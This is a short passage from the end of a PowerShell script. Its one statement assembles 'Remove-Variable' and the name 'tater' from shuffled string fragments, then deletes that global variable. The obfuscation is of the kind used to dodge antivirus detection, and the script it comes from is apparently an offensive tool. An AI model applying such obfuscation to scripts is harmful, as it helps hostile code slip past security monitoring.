        &("{3}{0}{1}{4}{2}" -f 'e','mo','iable','R','ve-Var') ("{1}{0}" -f'ater','t') -scope ("{0}{1}"-f'g','lobal')
    }

}

}